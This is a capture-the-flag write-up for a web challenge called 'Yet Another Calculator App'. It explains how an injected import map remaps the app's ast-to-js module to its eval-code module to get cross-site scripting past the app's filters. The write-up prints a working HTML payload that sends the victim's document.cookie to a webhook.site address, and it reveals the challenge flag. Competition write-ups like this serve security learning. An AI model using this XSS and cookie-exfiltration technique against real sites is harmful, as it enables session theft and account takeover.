# Yet Another Calculator App

Category: Web

Solves: 20

Points: 200

---

## Challenge Description

>There's nothing more exciting than corporate-SaaS products! If your business is in need of enhanced computational capabilities, make sure to check out Yet Another Calculator App.

## Write-up

There are many filters to prevent us from doing XSS.

In calc.js
```js
try {
    let ast;
    if (astProgram.type === "application/x-yaca-code") {
        const tokens = lex(program.code);
        ast = parse(tokens);
    } else {
        ast = JSON.parse(program.code);
    }

    const jsProgram = astToJs(ast);
    evalCode(jsProgram);
}
```

We can control `astProgram.type`, which is the type attribute for the script element.

What we can do is that we can give our code in JSON, and it will be parsed by `JSON.parse()`. Next, we change `astToJs` to `evalCode`, and we can execute our own code.

The way we make `astToJs` to `evalCode` is by using [Import maps](https://github.com/WICG/import-maps).

Here is how I did that

```html
<script id="program" language="json" type="importmap">
  {"imports":{"/js/ast-to-js.mjs":"/js/eval-code.mjs"},"name":"give me the flag pls~~","code":"{\"code\": \"new Image().src=\\\"https://webhook.site/xxx/?leak=\\\" + encodeURIComponent(document.cookie)\", \"variables\": []}"}
</script>
```

The type is set to `importmap`, and there is a `imports` key inside. `/js/ast-to-js.mjs` will be mapped to `/js/eval-code.mjs`. So the code `import astToJs from "/js/ast-to-js.mjs";` in calc.js will be the same as `import astToJs from "/js/eval-code.mjs";`, and `astToJs` will be `evalCode`.

I put the Javascript code in `code` to leak the cookie, and give an empty array for `variables`.

After we execute the solving script `solve.py`, we get the flag.

The flag is `pctf{someone_should_document_importmaps_in_mdn_probably}`.